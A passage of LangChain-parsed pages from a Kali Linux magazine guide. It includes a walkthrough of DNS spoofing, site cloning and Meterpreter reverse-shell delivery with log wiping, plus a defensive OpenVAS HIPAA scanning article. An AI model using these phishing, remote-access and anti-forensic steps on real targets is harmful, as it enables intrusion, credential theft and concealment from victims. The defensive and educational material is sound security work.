\\nin a Domain Name System (DNS) ‘name server’s \\ncache database’, making the name of the server to \\nreturn an incorrect IP address, diverting traffic to \\nanother computer.\\nStep to Step\\nOpen the terminal. Type and hit enter (Figure 7): \\nFigure 10.  Start Sniing, Step 4\\nFigure 11.  DNS Spoof, Step 5\\nFigure 12.  Social Engineering Toolkit, Step 1\\nFigure 13.  Social Engineering Attacks, Step 2\\nFigure 14.  Website Attacks, Step 3\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 30}, page_content=\"www.hakin9.org/en 31Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n# vi /usr/share/ettercap/etter.dns\\nJust edit and save, exit and enter after ‘ettercap-\\nG’ to open Ettercap in graphical mode.\\nGo Sniff: ‘Unified Sniffing’, when prompted, \\nchoose your NIC ‘eth0’ (Figure 8).\\nConcepts\\nThis type of attack is important to get some creden -\\ntials during the execution of the penetration test. It \\nconsists of sending false answers to DNS requests \\nthat are made. To execute this attack, you must ed -\\nit the file ‘etter.dns’, as it is the file ‘hosts’ windows \\nand linux, we can configure to which requests are \\nsent. In ‘Hosts’ click ‘Scan for hosts’.\\nAgain in “Hosts” click Host List ‘to view a list of all \\navailable IPs on the network, which will select the \\ntarget that will receive the false answers and click’ \\nAdd to Target 1’ (Figure 9).\\nNow click on ‘Start’, ‘Start Sniffing’.\\nAfter go ‘MitM’: ‘Arp Poisoning’. Select the option \\n‘Sniff remote connections’ as below and click ‘OK’ \\n(Figure 10).\\nGo to ‘Plugins’, ‘Manage the Plugins’ and double \\nclick dns_spoof’ (Figure 11).\\nDone that the ‘selected customer’ will start get -\\nting false answers to DNS.Cloning Site with Kali Linux\\nINTRODUCTION\\nSET Attack Method:\\nThe Social Engineer Toolkit (SET) has been de -\\nveloped to perform advanced attacks against the \\nhuman element. SET was designed to be launched \\nwith http://www.social-engineer.org  and quickly \\nbecame a standard tool in the arsenal of penetra -\\ntion testers. The attacks built into the toolkit are de -\\nsigned to be focused on attacks against a person \\nor organization used during a penetration test.\\nThis hacking method will work perfectly with the \\n‘DNS spoofing or Man in the Middle attack method’.\\nI will present methods of attack like this can have \\ncomputer in few steps.\\nStep to Step\\nEnter on Applications: Kali Linux: Exploitation \\nTools: Social Engineering Toolkit: then Select ‘se-\\ntoolkit’ (Figure 12).\\nFigure 15.  Java Applet Attack, Step 4\\nFigure 16. Site Cloning, Step 5\\nFigure 17.  Web Templates, Step 6\\nFigure 18.  URL to be cloned, Step 7\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 31}, page_content='Extra 03/2013 32AT TACK\\nThen Select option ‘Social Engineering Attacks’ \\nusing no. So it will create another window: Fig -\\nure 13. Then Select option ‘Website Attack Vec -\\ntors’ which is the unique way of using multiple web \\nbased attacks... (Figure 14).\\nAfter that Select option ‘Java Applet Attack’ \\nmethod will spoof a Java Certificate and deliver a \\n‘metasploit’ based payload (Figure 15).Select the option which is for ‘Site Cloning’ that \\nwill allow SET to clone the Site that you will define \\nso that it can utilize that attack (Figure 16).\\nAfter pressing enter on the ‘Web Template’ will \\nshow how to use the PORT/ NAT or other. Next \\nstep, enter the IP of your Kali linux, so you can do \\nreverse connection to your machine when the tar -\\nget using the link provided by you (Figure 17).\\nAfter you provide the URL to be cloned as Ya -\\nhoo, Twitter, Facebook. You can collect various in-\\nformation about the target (Figure 18).\\nProvide the URL to start cloning, and then, once \\nthat’s done, will start generating ‘payload’ and \\nsome files as jar file, index.html (Figure 19).\\nSelect the ‘payload’ necessary that you want to \\ngenerate. I’m using the second option, which is the \\n‘Windows Meterpreter Reverse_TCP’ that will cre -\\nate a shell access between the attacker and the \\ntarget machine that is between my Kali Linux (Fig -\\nure 20). It will display ‘list of Encoding’s’ that will \\nhelp you bypass the security target. I prefer ‘Back -\\ndoored Executable’, it is best to find a ‘spamhole’ \\non the machine in question (Figure 21).\\nWill begin to generate multiple ‘Powershell code \\nbased Injection’ based on common ports such as \\n Figure 19. Generating Payload, Step 8\\nFigure 20.  Windows Meterpreter Reverse_TCP, Step 9\\nFigure 21.  Backdoored Executable(BEST), Step 10\\nFigure 22.  Powershell, Step 1 1\\nFigure 23.  Reverse TCP Connection, Step 12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 32}, page_content=\"www.hakin9.org/en 33Hands-on: How To Create 'Backdoor' To Remote Access With Kali Linux\\n53, 80, 443, in his ‘Attacket machine’ to the target \\nusing one where the ‘payload’ is generated.\\nSelect Option 16, will ask for the ‘Port Number’. \\nPress Enter then it will use the default port number. \\nIt will launch the ‘Launch the Web SET’ will start \\nappearing and the number of vulnerabilities and \\nthen it will generate a link that you can move on \\nto the target and once he uses that link, your ma -\\nchine will create a connection ‘Reverse TCP Con -\\nnection ‘ with the attacker’s machine on the num -\\nber of doors (Figure 23).\\nThe Code execution ‘ PowerShell ‘, which will run \\nin the background and then will load ‘ MSF ‘ and \\ngenerate a ‘link’ that when a person clicks it will \\ncreates reverse connection open to you within the \\nnetwork (Figure 24).\\nThis will provide a link when trying to open the \\ntarget, all the information from your system back to us via ‘ Reverse TCP Connection’ (Figure 25). \\nWhile one tries to use this link will generate a con -\\nnection on some port between the attacker and the \\ntarget, which is ‘TCP’. After these procedures the \\n‘payload‘ is generated and when you use this link \\non the machine to open a cloned page also gener -\\nates the file ‘.jar‘ whose function is to establish the \\nconnection between the two machines (Figure 26).\\nLet’s create a session with the machine, going \\nto my local machine can check if the connection \\nwas successful or not. We should use the com -\\nmand ‘netstat’.\\nExample: netstat-year | find “57804”.\\nWhen we are connected to the target machine, \\nyou can run many programs and can edit the files.\\nRun ‘Event Viewer’ and remove all notifications, \\nso it becomes more difficult to track what is hap -\\npening with the machine.\\nAlthough we can trace the connection estab -\\nlished with the command “sessions-l”.\\nAfter running the command will start sending \\n‘HTTP packets’ to the target machine via the ‘GET \\nmethod’.\\nThis shows that the connection has been estab -\\nlished with the machine.\\nYou can use utilities such as Restart, Shutdown \\nthe system.\\nIt is worth remembering that I made this article \\nfor educational purposes only, I am totally against \\nthe cybernetic crime, so use it with conscience .\\nRAFAeL FONTeS SOUzA\\nOver the years, acquiring knowledge of \\nWebmaster programmer(HTML5,CSS,XML\\n,ActionScript), developer in languages like \\nPython, Shell Script, Perl, Pascal, Ruby, Ob -\\nject Pascal, C and Java. I started studying \\nwith thirteen (SQL database), i have exten -\\nsive experience in operating systems such \\nas Linux, UNIX, and Windows. I am maintainer of the “project \\nbacktrack team brazilian”, I am also a member of the “French \\nBacktrack Team” and made partnerships with groups from In -\\ndonesia and Algeria; prepared a collection of video lessons \\nand made them available on the website. I have good com -\\nmunication in groups and the general public, attended col -\\nlege projects with a focus on business organization, I am cur -\\nrently seeking for a work experience outside of Brazil”. \\nhttp://sourceforge.net/projects/cypherpunks/ \\nContact: fontes_rafael@hotmail.com \\n Figure 26.  Establish the connection, Step 15\\nFigure 25.  The attack, Step 14\\nFigure 24.  Starting the payload handler, Step 13\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 33}, page_content='Extra 03/2013 34DeFeNSe\\nOpen Source solutions can be leveraged as \\na low-cost and effective strategy to mini -\\nmize risk when used as component of a \\nlarger information security program. With a long \\n“track” record of community support, Kali is an \\nopen source Linux distribution containing many \\nsecurity tools to meet the needs of HIPAA network \\nvulnerability scans. \\nNote\\nThis article is not as much a how-to as it is a proof \\nof concept and evaluation of Kali on low-cost hard -\\nware (Raspberry Pi in this case). As such, I will dis -\\ncuss my overall experiences here but will not get \\ninto the weeds of the build process for the scan -\\nner. There are much better resources elsewhere \\nto explain the details of this particular project. In \\nother words, I am not reinventing the wheel here \\nand have borrowed heavily from readily available \\nonline resources. Think of this as more of a busi -\\nness case with some of the technical bits included.\\nAs Senior Consultant for a Managed Service \\nProvider company, I have a need to develop a \\nscalable low-cost solution for performing HIPAA \\nvulnerability scans. The scans will be part of a larg -\\ner Information Security consulting service to assist \\nclients with their HIPAA compliance program. As a \\nBusiness Associate  of Covered Entities (meaning \\n– vendor of medical companies), the security solu -tion will also be used to support the internal com -\\npliance program of our technology firm. \\nThe requirement for risk analysis (and conse -\\nquently vulnerability scans) is explained in the \\nGuidance on Risk Analysis Requirements under \\nthe HIPAA Security Rule  document published by \\nthe US Department of Health and Human Services \\n(http://www.hhs.gov/ocr/privacy/hipaa/administra -\\ntive/securityrule/rafinalguidancepdf.pdf ):\\nRisk Analysis Requirements under the Security \\nRule. The Security Management Process standard \\nin the Security Rule requires organizations to “[i]\\nmplement policies and procedures to prevent, de -\\ntect, contain, and correct security violations.” (45 \\nC.F.R. § 164.308(a)(1).) Risk analysis is one of four \\nrequired implementation specifications that pro -\\nvide instructions to implement the Security Man -\\nagement Process standard. Section 164.308(a)(1)\\n(ii)(A) states: RISK ANALYSIS (Required).\\nConduct an accurate and thorough assessment \\nof the potential risks and vulnerabilities to the confi -\\ndentiality, integrity, and availability of electronic pro -\\ntected health information held by the [organization].\\n…Vulnerability is defined in NIST Special Pub -\\nlication (SP) 800-30 as “[a] flaw or weakness in \\nsystem security procedures, design, implementa -\\ntion, or internal controls that could be exercised \\n(accidentally triggered or intentionally exploited) \\nand result in a security breach or a violation of the Kali Scanning for \\nHIPAA\\nA Proof of Concept: using Kali Linux to deploy distributed \\nnetwork vulnerability scanners for medical clients\\nThe Health Insurance Portability and Accountability Act of \\n1996 (HIPAA) requires organizations who handle electronic \\nProtected Health Information (e-PHI) to take action and \\nreduce risk relative to potential security breaches of digital \\ncommunication and storage of patient information. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 34}, page_content='www.hakin9.org/en 35Kali Scanning for HIPAA\\nsystem’s security policy.” Vulnerabilities, whether \\naccidentally triggered or intentionally exploited, \\ncould potentially result in a security incident, such \\nas inappropriate access to or disclosure of e-PHI. \\nVulnerabilities may be grouped into two general \\ncategories, technical and non-technical. Non-tech -\\nnical vulnerabilities may include ineffective or non-\\nexistent policies, procedures, standards or guide \\nlines. Technical vulnerabilities may include: holes, \\nflaws or weaknesses in the development of infor -\\nmation systems; or incorrectly implemented and/or \\nconfigured information systems.\\nProject Requirements\\nA build versus buy approach was taken to evalu -\\nate solutions as a scalable, affordable, and effective \\nmethod of conducting network vulnerability scans. \\nThe result of the scans will address HIPAA risk anal -\\nysis requirements while driving vulnerability remedi -\\nation plans. The final solution must scale with grow -\\ning business demands for security assessments so \\nautomation of distributed scanners was a primary \\nconsideration. Additionally, the scanners must be \\ncost-effective to deploy, easy to manage (more on \\nthis later), and enable centralized reporting.\\nHaving familiarity with the Backtrack Linux distri -\\nbution, Kali was a logical choice for a best of breed \\noffering in the open source community. So what \\nis Kali Linux? According to Kali.org, Kali Linux is \\nan advanced Penetration Testing and Security Au -\\nditing Linux distribution.  It is also a complete re-\\nbuild of Backtrack, its predecessor. Kali is free ( as \\nin beer ) and contains over 300 penetration testing \\ntools. This seems like a good fit for the low-cost re -\\nquirement of the project.\\nTo further control costs, the Raspberry Pi system \\non a chip (SoC) device was selected as the comput -\\ner hardware for the scanners. These tiny computers \\ncan be purchased from a number of distributors for \\n$35.00USD. It must be recognized at this point that \\nchoosing a low-powered device like the RPi is not \\nwithout trade-offs. We are seeking to balance cost, \\nsize, and power efficiency against performance re -\\nquirements and capabilities of the system. That be -\\ning said, it’s hard to argue that a better value can be \\nhad for a distributed network scanner. \\nWhat’s a Raspberry Pi?\\nAccording to the official website ( http://www.raspber -\\nrypi.org/faqs) , “the Raspberry Pi is a credit-card sized \\ncomputer that plugs into your TV and a keyboard. It’s \\na capable little PC which can be used for many of the \\nthings that your desktop PC does, like spreadsheets, \\nword-processing and games. It also plays high-def -\\ninition video. We want to see it being used by kids all over the world to learn programming.” Hardware \\nSpecifications (Raspberry Pi Model B):\\n•  CPU – 700 MHz ARM processor (overclocks to \\n1 GHz)\\n•  Storage – SD card slot\\n•  Memory – 512MB RAM\\n•  Graphics – Broadcom VideoCore IV\\n•  Video Out – Composite RCA and HDMI\\n•  Audio Out – 3.5mm jack \\n•  Networking – 10/100Mbps Ethernet\\n•  I/O Ports – 2x USB\\nFigure 1. Raspberry Pi Model B\\nDesigned as a project computer, the Raspberry Pi \\nappeared to be a good it for our speciic require -\\nments. I followed the documentation on Kali.org \\nfor installing Kali ARM on a Raspberry Pi. Since \\nthis is a proof of concept, an 8GB SDHC Class 10 \\ncard was used for provisioning the operating sys -\\ntem. A production system may require more stor -\\nage for running multiple reporting tools and keep -\\ning a local copy of the scanning history.\\nSome Notes on Installation\\nKali image used for testing: http://cdimage.kali.org/\\nkali-linux-1.0-armel-raspberrypi.img.gz.\\nWhile this is not a Kali/Raspberry Pi installation \\nhow-to, I figured I would at least touch on the un -\\nexpected problems encountered during the initial \\nset up process. It is often said that installing open \\nsource systems is not for the faint of heart. I agree. \\nWhile not always straightforward, a bit of Google-\\nfu usually saves the day…no exceptions here.\\nNote\\nI experienced problems with the kali-linux-1.0.4-\\narmel-rpi.img.gz version of the operating system \\n(the current version) which resulted in the key -\\nboard and mouse locking up in the desktop inter -\\nface. Troubleshooting this issue led me to forum \\nposts discussing the same symptoms and of suc -\\ncessful attempts using version 1.0, then applying \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 35}, page_content='Extra 03/2013 36DeFeNSe\\nupdates from there. This is the path I took in order \\nto make progress on the task at hand.\\nSome initial hardware problems were experi -\\nenced due to drawing too much power from the \\nUSB ports. For example, my Apple USB keyboard \\nwas detected by the operating system, but would \\nnot work. This was resolved by using a powered \\nUSB hub to offload the power draw. Trying a differ -\\nent keyboard worked fine without the hub, so your \\nmileage will vary. This is only of concern when ini -\\ntially configuring the RPi. A mouse and keyboard \\nwill not be used when the device is running on the \\nclient’s network. If you need the hub during pro -\\nduction, the Raspberry Pi can be powered off of \\nthe same USB hub adding additional power to the \\nmouse/keyboard. This is how I ran the device dur -\\ning my testing and eliminated the need for an ad -\\nditional power supply.\\nAlso, the default install does not fully utilize the \\nSD card which led to errors due to a full disk when \\nperforming updates. This was resolved by us -\\ning the fdisk followed by the resize2fs  utilities to \\nexpand the system partition to use the remain -\\ning free space. Exact details for this can be found \\nhere:  http://raspberrypi.stackexchange.com/ques -\\ntions/499/how-can-i-resize-my-root-partition .\\nBased on my experience here, some other soft -\\nware housekeeping items are needed (Listing 1)…\\nListing 1.  General Kali updates\\n#apt-get update – performs general software \\nupdates\\n#apt-get install xfce4 xfce4-goodies – installs \\nitems need to support the xserver GUI\\n#apt-get install iceweasel – installs the \\ndefault browser\\nWith the initial hiccups of the installation behind \\nme, the next step was to consider what tools from \\nthe new Kali system would be deployed to perform \\nthe network vulnerability scans. With so many ca -\\npabilities packed into this Linux security distro, \\nthere was no shortage of options.\\nRunning startx  from the command prompt cranks \\nup the desktop interface. Even if we will not normal -\\nly run our scripts and programs from the GUI, it is \\nhelpful to drive the system around a bit to familiarize \\nourselves with the tools loaded on the Kali platform. \\nBe prepared to grab a cup of coffee when first start -\\ning the graphic interface. The slower processing \\npower of the Raspberry box takes a few minutes to \\nload the desktop the first time. Patience is rewarded \\nwith the familiar Kali/Backtrack dragon logo.Selecting a Scanner\\nWith over 300 security tools available on the Ka -\\nli system, we must narrow down which tool (or \\ntools) to use for our purposes. Here are some of \\nthe requirements:\\n•  Scheduled scans for multiple clients,\\n•  lexibility in coniguration,\\n•  available (free) updates to vulnerability deinitions,\\n•  multiple options for reporting output,\\n•  secure transmission of reports (more on this to \\nfollow).\\nLet’s examine these requirements a bit more. Since \\nthe concept here is to create a set of distributed \\nscanners at various client sites, the system must be \\nable to run as a scheduled task and will ultimate -\\nly be called from a master script. Having lexibili -\\nty with its coniguration, the software should adapt \\nwell to changes in solution requirements over time. \\nFreely available vulnerability deinition updates will \\nkeep costs down while allowing the system to de -\\ntect ever-evolving system threats. The tool should \\nprovide multiple options for reporting output. Initially \\nreports will be generated in basic HTML or PDF for -\\nmats, but future requirements will necessitate cap -\\nturing granular scanning data for developing a more \\nsophisticated (eventual) self-service customer por -\\ntal. From a security standpoint, we are not storing \\nePHI; however, we are storing information sensitive \\nto the internal structure and systems of our clients’ \\nnetworks. As such, precautions to secure transmis -\\nsion of reports will be established as part of the so -\\nlution. For the reasons described above, I select -\\ned OpenVAS as the scanning tool for this proof of \\nconcept. No one system will be one hundred per -\\ncent effective all of the time. Certain vulnerabilities \\nwill be missed while some false-positives may be \\nreported. Remember – risk “reduction” is the goal \\nas risk “elimination” is an unreasonable expecta -\\ntion. The important thing is we are using the tool as \\npart of an overall security effort. A more attractive \\noption would be to deploy multiple scanning tools to \\nvalidate the results and cover gaps that exist from \\na single software solution. For the purposes of this \\nphase of the project, we will stick to using a single \\ntool for scanning and reporting.\\nWorking with OpenvAS\\nI ran my out-of-the-box OpenVAS install from the \\ndesktop and fired up the setup script included with \\nthe GUI menu options. After several attempts to \\nconfigure and run scans with no luck, I decided to \\npursue a different course of action. While search -\\ning for set up guides, I can across an invaluable \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 36}, page_content='www.hakin9.org/en 37Kali Scanning for HIPAA\\ntool – the openvas-check-setup  script. While time-\\nconsuming, the script checks out all parts of the \\nOpenVAS system and updates as necessary. I had \\nto do the following based on the fixes recommend -\\ned by the script: Listing 2 and Figure 2.\\nListing 2. Initial updating of OpenVAS\\n#apt-get install openvas-scanner (this updated \\nthe scanner and a good number of other com-\\nponents of the system)\\n#openvasmd –migrate (upgrades the database)\\n#openvas-scapdata-sync (update SCAP feed)\\n#openvas-certdata-sync (update CERT feed)\\n#openvassd (starts the OpenVAS Server)\\n#openvasmd (starts the OpenVAS Manager)\\n#openvasad (starts the OpenVAS Administrator)\\n#gsad (starts the Greenbone Security Assistant)\\nFigure 2.  Migrating the database\\nAfter performing the above, I still go an error stat -\\ning “ERROR: OpenVAS Manager is NOT running!” \\nTo double-check for listening services, I ran the \\ncommand: netstat -A inet –ntlp . As the OpenVAS \\nManager (openvasmd) was found to be listening \\non its default port, I ignored the “error” and pro -\\nceeded with testing (Figure 3).\\nSetting up the Scans\\nThe obligatory disclaimer: I am not an attorney; \\nhowever, I used to work for some. Be sure you have expressed written permission to perform any \\npenetration tests, vulnerability scans, or enumer -\\nation of network services and host information. \\nConducting security scans without permission is \\nagainst the law and not advocated here. For test -\\ning purposes, I have used my home network and \\nmy employer’s network (with permission) to run \\nthe scans. Enough said about that.\\nSetting up a scan is simply a matter of managing \\n(at a minimum): Tasks, Targets, and Scan Configs.\\nTasks – scan jobs made up of the other ele -\\nments. The tasks can be scheduled and leverage \\nEscalators, such as send an email when the task \\nis complete.\\nTargets – IP addresses or ranges of the network \\ndevices to scan. This can be a single Target con -\\nfiguration for a simple network or multiple (servers, \\nworkstations, network devices). Multiple targets \\nwould be useful when it is desirable to customize the \\nlevel of scanning based on different device types.\\nScan Configs – preset vulnerability scan con -\\nfigurations using different levels of scanning tech -\\nniques. As the more intrusive configs can bring \\ndown hosts, use caution when making decisions \\non how and when to run the scans.\\nFor this exercise, I set up three separate scan \\ntargets – our workstation network, our server net -\\nwork, and one for my work computer. I then creat -\\ned three tasks to scan the targets named – “Scan \\nworkstations – Full and fast”, “Scan servers – Full \\nand fast”, and “Scan my PC” respectively. For each \\nof these I used the Full and Fast scan option. This \\nwas the least invasive of the default set of scan \\nconfigurations. The overall process is straightfor -\\nward as the Greenbone Security Desktop interface \\nis intuitive in its layout. Several tabs at the bottom \\nof the application window delineate the various ar -\\neas for configuration.\\nI chose to run the scans manually and did not \\nschedule them. The time required to perform the \\nscans will vary based on the number of hosts being \\nscanned in the current task and the performance \\nof the scanner and network. Just to get an idea of \\nthe traffic generated during a scan, I ran Wireshark \\non my laptop to watch the vulnerability scans. Fur -\\nther analysis of the packets would reveal the mag -\\nic behind the scanning process (Figure 4).\\nHardware Performance\\nLet’s suffice it to say, the performance of the Rasp -\\nberry Pi is underwhelming in this application. This \\nis not unexpected actually and, to a certain degree, \\ninsignificant. While the speed of the scans could \\nbe increased by using faster hardware, we desire \\ninexpensive  and good enough . While scanning, \\nFigure 3.  Checking listening ports for the openvasmd service\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 37}, page_content='Extra 03/2013 38DeFeNSe\\nthe processor hovered around seventy percent uti -\\nlization. Further performance gains would be real -\\nized by running OpenVAS from the command line \\nonly and not from the GUI. In a distributed scanner \\nmodel, the desktop interface would only be used \\non the reporting server. In a real-world application, \\nI would choose to spend a little more on a signifi -\\ncantly faster device (and still stay below $100 per \\nscanner). Some attractive RPi alternatives for the \\nARM processor platform include the Beagle Bone \\nBlack and the Odroid U2.\\nAnalyzing the Results\\nOnce the scan(s) were finished, it was time to eval -\\nuate the results. In this case, we will look at a scan \\non my work laptop (a Windows 7 computer). I used \\nthe HTML version of the report although there are \\nother options including XML, PDF and text.\\nThe Host Summary area of the report provides a \\nhigh-level view of the number of vulnerabilities de -\\ntected and the threat level – High, Medium, or Low. \\nSince I used the Full and Fast scanning option, I as -\\nsumed the threat count would be fairly low. More in -\\nvasive scans would likely show more threats at the \\nexpense of time and higher network activity. For the \\ntest scan, the results show zero High level threats, \\ntwo Medium and seven Low level. A port summary \\nof the detected threats is shown Figure 5.\\nLet’s take a look at one of the Medium level threats. \\nThe same process will be used to examine each \\nthreat to determine a remediation plan for the cli -\\nent. One of the threats detected is called “NVT: DCE \\nServices Enumeration” on TCP port 135. A bit of re -search on the threat shows Windows computers use \\nthis port to look up various services running on a re -\\nmote computer and is used for remote management \\nof the device. The recommendation from the Open -\\nVAS report is to “filter incoming traffic to this port”.\\nFigure 5. OpenVAS HTML Report, Summary Section\\nA potential remediation could be to modify the fire -\\nwall rules on the Windows computer to only allow \\nIP packets sourcing from servers and administrative \\nworkstations. This would reduce the attack vector \\nby blocking connections from peer Windows clients \\non the network (which have no need to communi -\\ncate directly to the device). A comprehensive reme -\\ndiation plan would use a similar approach to ana -\\nlyze each threat identified by the scan. The process \\nof scanning and remediating identified problems will \\nFigure 4.  Greenbone Security Desktop interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 38}, page_content='www.hakin9.org/en 39Kali Scanning for HIPAA\\nresult in an overall risk reduction with respect to our \\nclients’ network security (Figure 6). \\nFigure 6. OpenVAS HTML Report, Security Issues\\nCentralized Reporting\\nOpenVAS is designed to leverage remote slave \\nscanners. This allows for the Greenbone Security \\nDesktop and the underlying OpenVAS components \\nto perform the heavy lifting of the remote scanning. \\nThe advantage of this capability is using a single in -\\nterface for scheduling scans and reporting. A cen -\\ntralized OpenVAS server can be used to manage \\nthe entire system. The distributed aspect of the solu -\\ntion will allow my security consulting service to scale \\nefficiently without unneeded visits to client sites. \\nWith direct access to all client reports, I can work di -\\nrectly with our managed services team to implement \\nthe remediations. While certainly a great feature, the \\nproblem with the solution is requiring multiple VPN \\nconnections into the networks of our medical clients. \\nThis risk can be mitigated by using a DMZ for the \\nOpenVAS master server and scheduling the scans \\nin a way where only one client VPN connection is re -\\nquired at a time. Leveraging on-demand VPN con -\\nnections in conjunction with an idle timeout would be \\nthe best configuration to eliminate these concerns.\\nNote\\nDue to the timeline for writing this article, the remote \\nscanning capability of OpenVAS was not tested.\\nFuture enhancements\\nAs with any project like this, there is always room \\nfor improvement. Future requirements to increase \\nremote system capabilities will likely push beyond \\nthe limits of the Raspberry Pi hardware. In that \\ncase, other slightly more expensive hardware so -\\nlutions could be considered without completely re -\\ninventing the wheel. For example, many other SoC \\nsystems are on the market with higher processor \\nspeeds and more memory than the RPi. As these \\ndevices use the same processor family as RPi, it \\nis expected Kali ARM support will enable use of \\nthese more capable hardware systems. Some like -\\nly future enhancements include:\\n•  packet captures of Internet trafic to keep a roll -\\ning history of network activity in the event of a \\nbreach,•  leverage additional scanning tools to validate \\nOpenVAS scans,\\n•  harden the Kali install to protect locally stored \\nvulnerability reports,\\n•  deploy a client self-service portal to view a his -\\ntory of scans and vulnerability remediation.\\nSummary\\nThis project started as a proof of concept to deter -\\nmine the viability of using open source tools like Kali \\nto deploy distributed network vulnerability scanners \\non low-cost hardware. The business case for this so -\\nlution is to provide value-added consulting services \\nto our medical clients and reduce risk as part of a \\ncomprehensive HIPAA compliance program. The ex -\\nperiences outlined here demonstrate that Raspber -\\nry Pi and Kali make an effective hardware/software \\nplatform for network scans. As is to be expected with \\nan open source project, more effort and technical \\nknowledge is required to deploy (and maintain) the \\nsolution; however, the long-term return on investment \\nmakes the endeavor worthwhile. The end goal is to \\nhave a completely automated and low-cost scanning \\nsolution where all parties have direct access to the \\nreports for compliance and remediation purposes. \\nThis proof of concept using Kali shows that the end \\ngoal is certainly within reach.\\nHIPAA Terms\\nCovered Entity – a healthcare provider, a health \\nplan, or healthcare clearinghouse.\\nBusiness Associate – a person or entity that per -\\nforms certain functions or activities that involve the \\nuse or disclosure of protected health information on \\nbehalf of, or provides services to, a covered entity.\\nElectronic Protected Health Information (e-PHI) \\n– individually identifiable health information is \\nthat which can be linked to a particular person. \\nCommon identifiers of health information include \\nnames, social security numbers, addresses, and \\nbirth dates.\\nCHARLIe WATeRS \\nCharlie Waters serves as the Security Oicer \\nand Senior Consultant for Ininity Network \\nSolutions, a Georgia-based MSP irm. His \\nbackground in technology began with an \\nearly curiosity and passion for computing \\nwith a Commodore 64 (at the age of twelve). A hobby turned \\ncareer has led the author on a journey from software develop -\\ner, web programmer/host, systems engineer, and management \\nin the public and private sector, to his current role in technology \\nconsulting. A life-long learner, Charlie maintains the same curi -\\nosity and passion for technology now in a career spanning if -\\nteen years.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 39}, page_content='Extra 03/2013 40DeFeNSe\\nIn the depth of crisis, hacking over the Internet \\nis still the very big problem, because the rate of \\ntechnology is increasing day by day and every -\\none here is for earning money. In that case some \\nearn the money through bad methods or some \\nby good methods. So, as a hacker I don’t support \\npeople earning money with bad methodologies. \\nNow with the depth of hacking, some big com -\\npanies over the Internet like Facebook, Google, \\nFirefox, and many more opened up a scheme of \\nbug bounties in which hackers from all over the \\nworld are invited to find out a bug or vulnerability \\nin their services, which if found they pay them with \\nhigh bounties for their hard + smart work. To find \\nout those bugs hackers have to use some meth -\\nodologies either based on command line or GUI \\nbased interfaces. Therefore in order to fulfill this \\ndemand of hackers, another type of Operating sys -\\ntem called Kali Linux came into the market which is \\nan extension to Backtrack. Now Kali Linux is very \\nmuch helpful for penetration testing and vulnerabil -\\nity assessments. I am going to show the various \\ntools that can be used for penetration testing and \\nalso for attacking. This guide on Kali Linux will de -\\nscribe both the parts.\\nNow before moving on to the real demonstra -\\ntions let’s just go through some of the definitions \\nand terminologies so that while performing there \\nshould be no dilemma in the minds of the people.What is Kali Linux and what’s its use?\\nNow this question must come in the minds of the \\npeople that what is Kali Linux. Let me just clear this \\nconcept that Kali Linux is a complete re-building of \\nthe Backtrack Linux distributions which is based \\nupon the Debian platform. Now Kali Linux is an ad -\\nvance version of OS which is used for penetration \\ntesting and security auditing Linux distributions. \\nThis is also an open source OS which is available \\nfreely on the Internet. So that anyone can down -\\nload from the Internet. \\nFeatures of Kali Linux\\nSome of the features that makes Kali much more \\ncompatible and useful than any other Linux distri -\\nbutions. \\n•  Kali Linux come up with 300+ penetration test -\\ning tools which are enough to audit any OS, \\nany website or web apps.\\n•  Much more powerful and faster than Backtrack.\\n•  In Backtrack many tools didn’t work which are \\neliminated in Kali.\\n•  Open source and freely available on Internet.\\n•  Kali Linux is much more compatible with wire -\\nless devices.\\n•  Comes in a package of multi languages so that \\nevery person can enjoy assessments in their \\nown language.KALI LINUX\\nA Solution to HACKINg/SeCURITY\\nToday is the world of technology and everyone somehow is \\nattached to it. Some are using the technology for the good \\npurpose and some are using it for bad purposes and Internet \\nis one of those technologies which define both my statements. \\nInternet is being used both by the good (the White Hats) and \\nthe bad (the Black Hats). So, my paper is totally based on the \\nabove line that the OS (Operating System) KALI LINUX (which \\nis an extension to Backtrack) can be used in both the ways \\neither in good things or in bad things. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 40}, page_content='www.hakin9.org/en 41KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  The packages that are included in the Kali \\nLinux are signed by each individual (GPG sig -\\nnatures).\\n•  It includes the latest patch for injections which \\ncould help the pentesters to do assessments \\non the various wireless techniques \\n•  And many more.\\nLet us have a close look to Kali now.\\nA survey to Kali Linux\\nThe outer look of Kali is pretty much different from \\nany other Linux distributions like backtrack. The \\ndefault username and password to enter into the \\nKali is same as that of backtrack – username – \\nroot and password – toor (Figure 1). This is how exactly the Kali looks when you en -\\nter to the main desktop. Just reject the folders. \\nNow this is my Kali installed in the virtual ma -\\nchine and I am not wasting the time in the instal -\\nlation process because people are smart enough \\nto carry out the installation of any operating sys -\\ntem. So, let’s just focus on our main task. Just \\nlook at the top-right corner of the window it will \\nshow that who is currently logged into your sys -\\ntem (Figure 2).\\nNow moving on to the next, the very first task \\nwhen you enter into the Kali is to check whether \\nthe Internet connection is working fine or not. Be -\\nlow in the snapshot just look at the cursor at the \\ntop right corner showing the wired network which \\nmeans the Internet is working fine in the virtual ma -\\nchine with NAT enabled (Figure 3).\\nNow let’s get familiar 